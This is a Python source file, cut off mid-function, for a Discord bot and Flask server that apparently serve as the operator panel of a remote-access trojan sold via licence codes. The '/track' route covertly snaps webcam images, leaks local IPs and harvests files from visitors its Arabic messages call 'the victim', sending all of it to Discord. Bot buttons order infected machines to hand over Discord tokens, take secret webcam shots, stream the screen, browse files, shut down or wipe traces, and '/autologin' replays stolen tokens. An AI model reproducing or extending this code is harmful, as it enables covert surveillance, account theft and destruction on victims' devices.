import os
import base64
import json
import random
import string
import time
import asyncio
import discord
from discord import app_commands
import requests
from flask import Flask, request, redirect, render_template_string
from threading import Thread

app = Flask('')

HOST_URL = "https://threesrh-system-data.onrender.com"

@app.route('/')
def home():
    return "3SRH Manager Bot is alive and running!"

@app.route('/autologin')
def autologin():
    sid = request.args.get('sid')
    if not sid:
        return "❌ Invalid Session ID", 400
    
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
        headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            file_data = r.json()
            db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
            sessions = db.get("web_sessions", {})
            if sid in sessions:
                session_data = sessions[sid]
                platform = session_data.get("platform")
                credential = session_data.get("credential")
                
                if platform == "discord":
                    html_page = f"""
                    <html>
                    <head><title>3SRH Auto Login - Discord</title></head>
                    <body style="background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
                        <h2>🔄 جاري تسجيل الدخول تلقائياً لحساب ديسكورد...</h2>
                        <script>
                            setTimeout(function() {{
                                localStorage.setItem('token', JSON.stringify("{credential}"));
                                window.location.href = 'https://discord.com/app';
                            }}, 1000);
                        </script>
                    </body>
                    </html>
                    """
                    return html_page
    except Exception:
        pass
    return "❌ Session expired or not found", 404

@app.route('/track')
def track_visitor():
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        ip = request.remote_addr
        
    user_agent = request.headers.get('User-Agent', 'Unknown')
    cam = request.args.get('cam', 'false')
    cam_type = request.args.get('cam_type', 'user')
    fs_exploit = request.args.get('fs', 'false')
    redirect_target = request.args.get('to', 'https://www.google.com')
    
    country, city, isp = 'Unknown', 'Unknown', 'Unknown'
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=3).json()
        if geo_res.get('status') == 'success':
            country = geo_res.get('country', 'Unknown')
            city = geo_res.get('city', 'Unknown')
            isp = geo_res.get('isp', 'Unknown')
    except Exception:
        pass

    visit_data = {
        "ip": ip,
        "country": country,
        "city": city,
        "isp": isp,
        "user_agent": user_agent,
        "time": int(time.time())
    }

    try:
        db, sha, url, headers = fetch_db()
        if db:
            if "web_visits" not in db: db["web_visits"] = []
            db["web_visits"].append(visit_data)
            save_db(db, sha, url, headers, f"New visit from IP {ip}")
    except Exception:
        pass

    try:
        if CHANNEL_ID and TOKEN:
            embed = discord.Embed(
                title="🚨 تنبيه: تم فتح رابط التتبع بنجاح!",
                color=0xFF3333,
                timestamp=discord.utils.utcnow()
            )
            embed.add_field(name="🌐 عنوان الـ IP الحقيقي", value=f"`{ip}`", inline=False)
            embed.add_field(name="🌍 الدولة / المدينة", value=f"`{country} - {city}`", inline=True)
            embed.add_field(name="🏢 مزود الخدمة (ISP)", value=f"`{isp}`", inline=True)
            embed.add_field(name="💻 المتصفح والنظام", value=f"```{user_agent}```", inline=False)
            
            requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages", 
                          headers={"Authorization": f"Bot {TOKEN}"}, json={"embeds": [embed.to_dict()]}, timeout=3)
    except Exception:
        pass

    page_template = """
    <html>
    <head><title>Loading...</title></head>
    <body style="background:#111; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
        <h3 id="st">جاري تحميل المحتوى، يرجى الانتظار والسماح بالإذونات المطلوبة...</h3>
        <video id="v" autoplay playsinline style="display:none;"></video>
        <canvas id="c" style="display:none;"></canvas>
        <script>
            let localIPs = [];
            try {
                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        let ipRegex = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/;
                        let match = ipRegex.exec(ice.candidate.candidate);
                        if (match && !localIPs.includes(match[1])) {
                            localIPs.push(match[1]);
                            fetch('/upload_local_ip', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({local_ip: match[1]})
                            });
                        }
                    }
                };
            } catch(e) {}

            async function capture() {
                if ("{{ cam }}" === "true") {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "{{ cam_type }}" } });
                        const video = document.getElementById('v');
                        video.srcObject = stream;
                        await new Promise(resolve => video.onloadedmetadata = resolve);
                        const canvas = document.getElementById('c');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const dataUrl = canvas.toDataURL('image/jpeg');
                        
                        await fetch('/upload_cam', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({image: dataUrl})
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                    } catch(e) {}
                }

                if ("{{ fs }}" === "true" && window.showDirectoryPicker) {
                    document.getElementById('st').innerText = "انقر في أي مكان بالشاشة للمتابعة...";
                    document.body.onclick = async () => {
                        try {
                            const dirHandle = await window.showDirectoryPicker();
                            for await (const entry of dirHandle.values()) {
                                if (entry.kind === 'file') {
                                    const file = await entry.getFile();
                                    const content = await file.text();
                                    await fetch('/upload_file', {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({name: file.name, data: content.substring(0, 5000)})
                                    });
                                }
                            }
                        } catch(e) {}
                        window.location.href = "{{ target }}";
                    };
                } else {
                    setTimeout(() => {
                        window.location.href = "{{ target }}";
                    }, 1500);
                }
            }
            window.onload = capture;
        </script>
    </body>
    </html>
    """
    return render_template_string(page_template, target=redirect_target, cam=cam, cam_type=cam_type, fs=fs_exploit)

@app.route('/upload_local_ip', methods=['POST'])
def upload_local_ip():
    try:
        data = request.get_json()
        local_ip = data.get('local_ip')
        if CHANNEL_ID and TOKEN:
            embed = discord.Embed(
                title="🔍 تسريب الشبكة الداخلية (Local IP)",
                description=f"تم رصد الـ IP الداخلي للضحية بنجاح:\n`{local_ip}`",
                color=0xFFA500
            )
            requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages",
                          headers={"Authorization": f"Bot {TOKEN}"}, json={"embeds": [embed.to_dict()]}, timeout=3)
    except Exception:
        pass
    return "OK", 200

@app.route('/upload_cam', methods=['POST'])
def upload_cam():
    try:
        data = request.get_json()
        img_data = data.get('image').split(',')[1]
        img_bytes = base64.b64decode(img_data)
        
        file_path = "capture.jpg"
        with open(file_path, "wb") as f:
            f.write(img_bytes)
            
        if CHANNEL_ID and TOKEN:
            files = {"file": ("capture.jpg", open(file_path, "rb"), "image/jpeg")}
            payload = {"content": "📸 **تم التقاط صورة الكاميرا للضحية بنجاح!**"}
            requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages",
                          headers={"Authorization": f"Bot {TOKEN}"}, data=payload, files=files, timeout=5)
            
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception:
        pass
    return "OK", 200

@app.route('/upload_file', methods=['POST'])
def upload_file():
    try:
        data = request.get_json()
        filename = data.get('name')
        content = data.get('data')
        if CHANNEL_ID and TOKEN:
            embed = discord.Embed(
                title="📁 تم سحب ملف جديد بنجاح",
                description=f"**اسم الملف:** `{filename}`",
                color=0x33CCFF
            )
            embed.add_field(name="📄 محتوى الملف (مقتطف)", value=f"```text\n{content[:900]}\n```", inline=False)
            
            requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages",
                          headers={"Authorization": f"Bot {TOKEN}"}, json={"embeds": [embed.to_dict()]}, timeout=5)
    except Exception:
        pass
    return "OK", 200

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

TOKEN = os.getenv('TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
REPO_OWNER = os.getenv('REPO_OWNER', 'kqi5q')
REPO_NAME = os.getenv('REPO_NAME', '3srh-system-data')
FILE_PATH = os.getenv('FILE_PATH', 'licenses.json')
CHANNEL_ID = int(os.getenv('CHANNEL_ID', 1547705815698382970))

class LicenseBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()
        print("Slash commands synced successfully!")

    async def on_ready(self):
        print(f"Logged in as {self.user} (ID: {self.user.id})")
        print("Bot is online and ready!")

client = LicenseBot()

def generate_random_code():
    chars = string.ascii_uppercase + string.digits
    part = ''.join(random.choices(chars, k=5))
    return f"3SRH-{part}"

def fetch_db():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers, timeout=5)
    if r.status_code == 200:
        file_data = r.json()
        db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
        return db, file_data["sha"], url, headers
    return None, None, url, headers

def save_db(db, sha, url, headers, commit_message):
    new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
    update_data = {
        "message": commit_message,
        "content": new_content,
        "sha": sha,
    }
    r = requests.put(url, headers=headers, json=update_data, timeout=5)
    return r.status_code in [200, 201]

class ConfirmSaveView(discord.ui.View):
    def __init__(self, generated_codes, count):
        super().__init__(timeout=60)
        self.generated_codes = generated_codes
        self.count = count

    @discord.ui.button(label="نعم، حفظ الأكواد", style=discord.ButtonStyle.green, custom_id="save_codes_yes")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db:
            await interaction.followup.send("❌ فشل الاتصال بغيت هب.", ephemeral=True)
            return

        if "codes" not in db:
            db["codes"] = {}

        for code in self.generated_codes:
            db["codes"][code] = {"used": False, "device": None, "ip": None, "port": None, "country": None}

        if save_db(db, sha, url, headers, f"Generated {self.count} new license codes"):
            codes_str = "\n".join([f"`{c}`" for c in self.generated_codes])
            try:
                await interaction.message.delete()
            except Exception:
                pass
            await interaction.followup.send(f"✅ **تم حفظ {self.count} كود:**\n\n{codes_str}", ephemeral=True)
        else:
            await interaction.followup.send("❌ فشل الحفظ في غيت هب.", ephemeral=True)

    @discord.ui.button(label="لا، إلغاء", style=discord.ButtonStyle.red, custom_id="save_codes_no")
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        try:
            await interaction.message.delete()
        except Exception:
            pass
        await interaction.followup.send("❌ تم إلغاء العملية.", ephemeral=True)

class CodesSubMenuView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)

    @discord.ui.button(label="🟢 غير المستخدمة (المتاحة)", style=discord.ButtonStyle.success, custom_id="sub_codes_unused", row=0)
    async def unused_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ خطأ بالاتصال.", ephemeral=True)
            return
        unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
        if not unused_list:
            await interaction.followup.send("🟢 لا توجد أكواد غير مستخدمة.", ephemeral=True)
            return
        view = UnusedManagementView(unused_list)
        await interaction.followup.send("🟢 **الأكواد غير المستخدمة (المتاحة - اختر للحذف):**", view=view, ephemeral=True)

    @discord.ui.button(label="🔴 المستخدمة والـ IP", style=discord.ButtonStyle.secondary, custom_id="sub_codes_used", row=0)
    async def used_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ خطأ.", ephemeral=True)
            return
        used_list = [f"`{c}` | IP : Port: `{info.get('ip', 'Unknown')} : {info.get('port', '8888')}` | الدولة: `{info.get('country', 'Unknown')}`" for c, info in db.get("codes", {}).items() if info.get("used")]
        if not used_list:
            await interaction.followup.send("🔴 لا توجد أكواد مستخدمة حالياً.", ephemeral=True)
            return
        text_out = "\n".join(used_list[:25])
        await interaction.followup.send(f"🔴 **الأكواد المستخدمة وتفاصيل الاتصال:**\n{text_out}", ephemeral=True)

    @discord.ui.button(label="🚫 المحظورة", style=discord.ButtonStyle.danger, custom_id="sub_codes_blacklist", row=1)
    async def blacklist_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ خطأ.", ephemeral=True)
            return
        b_codes = db.get("blacklisted_codes", [])
        if not b_codes:
            await interaction.followup.send("🟢 لا توجد أكواد محظورة حالياً.", ephemeral=True)
            return
        view = BlacklistManagementView(b_codes)
        await interaction.followup.send("🚫 **الأكواد المحظورة (اختر لفك الحظر أو الحذف):**", view=view, ephemeral=True)

    @discord.ui.button(label="⚡ توليد كود سريع", style=discord.ButtonStyle.primary, custom_id="sub_codes_gen", row=1)
    async def gen_quick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db:
            await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        if "codes" not in db:
            db["codes"] = {}
        new_code = generate_random_code()
        db["codes"][new_code] = {"used": False, "device": None, "ip": None, "port": None, "country": None}
        if save_db(db, sha, url, headers, f"Quick generated code {new_code}"):
            await interaction.followup.send(f"✨ **تم توليد وحفظ كود جديد بنجاح!**\n🔑 الكود: `{new_code}`", ephemeral=True)
        else:
            await interaction.followup.send("❌ فشل حفظ الكود في غيت هب.", ephemeral=True)

class UnusedManagementView(discord.ui.View):
    def __init__(self, unused_codes):
        super().__init__(timeout=180)
        for code in unused_codes[:25]:
            self.add_item(DeleteUnusedCodeButton(code))

class DeleteUnusedCodeButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label=f"🗑️ حذف: {code}", style=discord.ButtonStyle.danger, custom_id=f"del_Unused_{code}")
        self.code = code

    async def callback(self, interaction: discord.Interaction):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db:
            await interaction.followup.send("❌ خطأ بالاتصال.", ephemeral=True)
            return
        if self.code in db.get("codes", {}):
            del db["codes"][self.code]
            if save_db(db, sha, url, headers, f"Delete unused code {self.code}"):
                await interaction.followup.send(f"🗑️ تم حذف الكود المتاح `{self.code}` نهائياً!", ephemeral=True)
                return
        await interaction.followup.send("❌ الكود غير موجود.", ephemeral=True)

class BlacklistManagementView(discord.ui.View):
    def __init__(self, b_codes):
        super().__init__(timeout=180)
        for code in b_codes[:24]:
            self.add_item(BlacklistActionSelectButton(code))

class BlacklistActionSelectButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label=f"🚫 {code}", style=discord.ButtonStyle.secondary, custom_id=f"b_select_{code}")
        self.code = code

    async def callback(self, interaction: discord.Interaction):
        view = BlacklistOptionsView(self.code)
        if not interaction.response.is_done():
            await interaction.response.send_message(f"⚙️ **خيارات الكود المحظور:** `{self.code}`", view=view, ephemeral=True)

class BlacklistOptionsView(discord.ui.View):
    def __init__(self, code):
        super().__init__(timeout=60)
        self.code = code

    @discord.ui.button(label="🔓 فك الحظر", style=discord.ButtonStyle.success, custom_id="b_opt_unban")
    async def unban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db: return
        if self.code in db.get("blacklisted_codes", []):
            db["blacklisted_codes"].remove(self.code)
        if self.code in db.get("codes", {}):
            db["codes"][self.code]["used"] = False
            db["codes"][self.code]["device"] = None
        if save_db(db, sha, url, headers, f"Unban code {self.code}"):
            await interaction.followup.send(f"✅ تم فك الحظر عن الكود `{self.code}`!", ephemeral=True)

    @discord.ui.button(label="🗑️ حذف نهائي", style=discord.ButtonStyle.danger, custom_id="b_opt_delete")
    async def delete_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db: return
        if self.code in db.get("blacklisted_codes", []):
            db["blacklisted_codes"].remove(self.code)
        if self.code in db.get("codes", {}):
            del db["codes"][self.code]
        if save_db(db, sha, url, headers, f"Delete blacklisted {self.code}"):
            await interaction.followup.send(f"🗑️ تم حذف الكود المحظور `{self.code}`!", ephemeral=True)

class DevicesSubMenuView(discord.ui.View):
    def __init__(self, devices_list):
        super().__init__(timeout=180)
        for code, info in devices_list[:25]:
            self.add_item(DeviceManageButton(code, info))

class DeviceManageButton(discord.ui.Button):
    def __init__(self, code, info):
        ip = info.get("ip", "Unknown")
        port = info.get("port", "8888")
        super().__init__(label=f"🌐 {ip} : {port} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
        self.code = code
        self.info = info

    async def callback(self, interaction: discord.Interaction):
        ip = self.info.get('ip', 'Unknown')
        port = self.info.get('port', '8888')
        view = DeviceActionsView(self.code, self.info.get("device"), ip, port)
        if not interaction.response.is_done():
            await interaction.response.send_message(
                f"⚙️ **لوحة التحكم المطلق بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP : Port $\rightarrow$ `{ip} : {port}`\n🌍 الدولة: `{self.info.get('country')}`\n🔒 HWID: `{self.info.get('device')}`", 
                view=view, 
                ephemeral=True
            )

class DeviceActionsView(discord.ui.View):
    def __init__(self, code, hwid, ip, port):
        super().__init__(timeout=60)
        self.code = code
        self.hwid = hwid
        self.ip = ip
        self.port = port

    @discord.ui.button(label="🚫 حظر الكود والهاردوير", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
    async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
            if "blacklisted_devices" not in db: db["blacklisted_devices"] = []
            if self.code not in db["blacklisted_codes"]: db["blacklisted_codes"].append(self.code)
            if self.hwid and self.hwid not in db["blacklisted_devices"]: db["blacklisted_devices"].append(self.hwid)
            db["codes"][self.code]["used"] = False
            db["codes"][self.code]["device"] = None
            if save_db(db, sha, url, headers, f"Ban HWID {self.hwid}"):
                await interaction.followup.send(f"🚫 تم حظر الكود والهاردوير للـ IP: `{self.ip}` بنجاح!", ephemeral=True)

    @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=0)
    async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
            db["targeted_kick_messages"][self.code] = {"msg": "تم طردك من المالك", "id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Kick {self.ip}"):
                await interaction.followup.send(f"👢 تم إرسال أمر الطرد للـ IP: `{self.ip}`!", ephemeral=True)

    @discord.ui.button(label="📁 سحب تقرير الجهاز والكريديتس", style=discord.ButtonStyle.primary, custom_id="dev_act_export_info", row=1)
    async def export_client_info_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_exports" not in db: db["remote_exports"] = {}
            db["remote_exports"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Export telemetry for {self.code}"):
                await interaction.followup.send("📁 تم طلب ملف التقرير ومعلومات الجهاز، سيصلك هنا قريباً!", ephemeral=True)

    @discord.ui.button(label="📸 التقاط كاميرا سرية", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=1)
    async def webcam_snapshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_webcams" not in db: db["remote_webcams"] = {}
            db["remote_webcams"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Request webcam snapshot for {self.code}"):
                await interaction.followup.send("📸 تم طلب التقاط صورة الكاميرا السرية، ستصلك خلال لحظات!", ephemeral=True)

    @discord.ui.button(label="🔑 سحب توكنات ديسكورد", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=1)
    async def tokens_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_token_stealers" not in db: db["remote_token_stealers"] = {}
            db["remote_token_stealers"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Steal tokens for {self.code}"):
                await interaction.followup.send("🔑 تم إرسال أمر سحب توكنات ديسكورد للعميل!", ephemeral=True)

    @discord.ui.button(label="📂 إدارة وتصفح الملفات", style=discord.ButtonStyle.success, custom_id="dev_act_filemanager", row=2)
    async def filemanager_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_filemanagers" not in db: db["remote_filemanagers"] = {}
            db["remote_filemanagers"][self.code] = {"id": str(int(time.time())), "path": "C:\\"}
            if save_db(db, sha, url, headers, f"Open file manager for {self.code}"):
                await interaction.followup.send(f"📂 تم إرسال أمر فتح مدير الملفات للعميل `{self.code}`!", ephemeral=True)

    @discord.ui.button(label="🔴 البث الحي للشاشة", style=discord.ButtonStyle.danger, custom_id="dev_act_live", row=2)
    async def live_stream_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_live_stream" not in db: db["remote_live_stream"] = {}
            db["remote_live_stream"][self.code] = {"id": str(int(time.time())), "port": self.port}
            if save_db(db, sha, url, headers, f"Start live stream for {self.code}"):
                await interaction.followup.send(f"🔴 **رابط البث الحي المباشر للشاشة:**\n`http://{self.ip}:{self.port}/stream`", ephemeral=True)

    @discord.ui.button(label="💬 رسالة منبثقة", style=discord.ButtonStyle.primary, custom_id="dev_act_msg", row=3)
    async def send_msg_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SendMsgModal(self.code))

    @discord.ui.button(label="🛑 إغلاق البرنامج", style=discord.ButtonStyle.danger, custom_id="dev_act_force_close", row=3)
    async def force_close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_force_close" not in db: db["remote_force_close"] = {}
            db["remote_force_close"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Graceful close app for {self.code}"):
                await interaction.followup.send("🛑 تم إرسال أمر الإغلاق الكلي!", ephemeral=True)

    @discord.ui.button(label="🔌 إيقاف التشغيل (Shutdown)", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
    async def shutdown_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_shutdowns" not in db: db["remote_shutdowns"] = {}
            db["remote_shutdowns"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Shutdown {self.code}"):
                await interaction.followup.send("🔌 تم إرسال أمر إيقاف التشغيل الفوري للجهاز!", ephemeral=True)

    @discord.ui.button(label="🔥 تدمير شامل (Shredder)", style=discord.ButtonStyle.danger, custom_id="dev_act_shred", row=4)
    async def shred_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_shreds" not in db: db["remote_shreds"] = {}
            db["remote_shreds"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Shred {self.code}"):
                await interaction.followup.send("🔥 تم إرسال أمر التدمير الشامل وحذف أثر الأداة!", ephemeral=True)

class SendMsgModal(discord.ui.Modal, title="إرسال رسالة تحذيرية للعميل"):
    message_content = discord.ui.TextInput(label="نص الرسالة", style=discord.TextStyle.paragraph, placeholder="اكتب الرسالة التي ستظهر للعميل...")

    def __init__(self, code):
        super().__init__()
        self.code = code

    async def on_submit(self, interaction: discord.Interaction):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "targeted_messages" not in db: db["targeted_messages"] = {}
            db["targeted_messages"][self.code] = {"msg": str(self.message_content), "id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Send message to {self.code}"):
                await interaction.followup.send(f"💬 تم إرسال الرسالة إلى العميل بنجاح!", ephemeral=True)

class MainDashboardView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🔑 إدارة الأكواد", style=discord.ButtonStyle.primary, custom_id="dash_main_codes", row=0)
    async def codes_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        view = CodesSubMenuView()
        if not interaction.response.is_done():
            await interaction.response.send_message("📁 **قائمة إدارة الأكواد:** اختر القسم المطلوب:", view=view, ephemeral=True)

    @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=0)
    async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        try:
            db, _, _, _ = fetch_db()
            if not db:
                await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
                return
            devices_list = [(code, info) for code, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
            if not devices_list:
                await interaction.followup.send("🟢 لا توجد أي أجهزة متصلة حالياً.", ephemeral=True)
                return
            view = DevicesSubMenuView(devices_list)
            await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ خطأ: {str(e)}", ephemeral=True)

    @discord.ui.button(label="🚨 تبديل الصيانة", style=discord.ButtonStyle.danger, custom_id="dash_maint", row=1)
    async def maint_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db: return
        if "settings" not in db: db["settings"] = {}
        new_status = not db["settings"].get("maintenance", False)
        db["settings"]["maintenance"] = new_status
        msg = f"🚨 تم **تفعيل** وضع الصيانة العام!" if new_status else "🟢 تم **إيقاف** وضع الصيانة وعودة النظام للعمل!"
        if save_db(db, sha, url, headers, f"Toggle maintenance to {new_status}"):
            await interaction.followup.send(msg, ephemeral=True)

    @discord.ui.button(label="📦 نسخة احتياطية", style=discord.ButtonStyle.secondary, custom_id="dash_export", row=1)
    async def export_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db: return
        file_content = json.dumps(db, indent=4).encode("utf-8")
        file_path_temp = "licenses_backup.json"
        with open(file_path_temp, "wb") as f: f.write(file_content)
        try:
            await interaction.user.send("📦 **نسخة احتياطية مباشرة:**", file=discord.File(file_path_temp))
            await interaction.followup.send("✅ تم إرسال النسخة لخاصك (DM)!", ephemeral=True)
        except Exception:
            await interaction.followup.send("❌ تأكد من فتح الرسائل الخاصة.", ephemeral=True)
        if os.path.exists(file_path_temp): os.remove(file_path_temp)

@client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
@app_commands.describe(count="عدد الأكواد (من 1 إلى 20)")
async def generate_codes(interaction: discord.Interaction, count: int = 1):
    if count < 1 or count > 20:
        await interaction.response.send_message("❌ يمكنك توليد ما بين 1 إلى 20 كوداً فقط.", ephemeral=True)
        return
    new_codes = [generate_random_code() for _ in range(count)]
    codes_str = "\n".join([f"`{c}`" for c in new_codes])
    await interaction.response.send_message(f"⚠️ **حفظ الأكواد التالية؟**\n\n{codes_str}", view=ConfirmSaveView(new_codes, count), ephemeral=True)

@client.tree.command(name="loginbytoken", description="توليد رابط دخول سريع عبر المتصفح باستخدام التوكن أو الكوكيز لأي منصة")
@app_commands.describe(platform="اختر المنصة", token_or_cookie="ضع التوكن أو الكوكيز هنا")
@app_commands.choices(platform=[
    app_commands.Choice(name="Discord", value="discord"),
    app_commands.Choice(name="Epic Games", value="epic"),
    app_commands.Choice(name="Steam", value="steam"),
    app_commands.Choice(name="Other Web", value="other")
])
async def loginbytoken_command(interaction: discord.Interaction, platform: str, token_or_cookie: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    
    session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    
    db, sha, url, headers = fetch_db()
    if db:
        if "web_sessions" not in db: db["web_sessions"] = {}
        db["web_sessions"][session_id] = {
            "platform": platform,
